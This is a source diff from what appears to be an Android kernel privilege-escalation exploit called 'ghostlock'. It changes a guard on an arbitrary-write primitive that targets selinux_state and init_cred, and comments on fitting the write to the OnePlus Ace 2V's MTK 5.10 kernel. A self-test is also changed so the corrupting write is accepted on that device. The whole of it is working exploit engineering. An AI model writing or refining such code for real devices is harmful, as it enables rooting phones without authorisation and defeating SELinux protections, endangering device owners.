@@ -97,9 +97,14 @@ namespace ghostlock::memory {
         const WriteRequest *request, const PayloadWriteLayout *layout) {
         if (!payload_write_layout_matches_request(request, layout)) return 0;
         /* W1 stores its page-derived value across selinux_state fields. An even
-     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
+         * byte 2 clears `initialized` and breaks every subsequent SID lookup.
+         * The checked bit is layout-specific: on MTK 5.10 (OnePlus Ace 2V) the
+         * mm_struct slab pages always land on bit16 == 0, yet the byte that
+         * reaches `initialized` is byte 1 (fake_right low 16 bits are 0x0100),
+         * which stays odd regardless of the page. Check that byte instead so
+         * the guard keeps its intent while the W1 write can proceed. */
         if (request->mode == WriteMode::Zero && request->preserve_child &&
-            ((layout->right >> 16) & 1) == 0)
+            ((layout->right >> 8) & 1) == 0)
             return 0;
         return 1;
     }
@@ -156,9 +161,20 @@ namespace ghostlock::memory {
             0xffffff8000124000ULL, WriteMode::Zero, false);
         PayloadWriteLayout rejected = payload_write_layout(
             &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
-        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
+        /* MTK 5.10 acceptance: a 4KB-aligned page keeps byte 1 odd, so the
+         * guarded W1 write is now accepted (the bit16 guard was layout-
+         * specific and always rejected MTK slab pages). A layout whose byte 1
+         * is even must still be rejected to keep the anti-corruption intent. */
+        if (!payload_write_layout_accepts_page(&w1, &rejected)) return 0;
         rejected.right = 0;
         if (payload_write_layout_matches_request(&w1, &rejected)) return 0;
+        PayloadWriteLayout bad = {
+            .parent = rejected.parent,
+            .right = 0xffffff8800200000ULL,
+            .left = rejected.left,
+            .fops = rejected.fops,
+        };
+        if (payload_write_layout_accepts_page(&w1, &bad)) return 0;
 
         std::array < unsigned char, 0x80 > legacy_stamp{};
         std::array < unsigned char, 0x80 > current_stamp{};
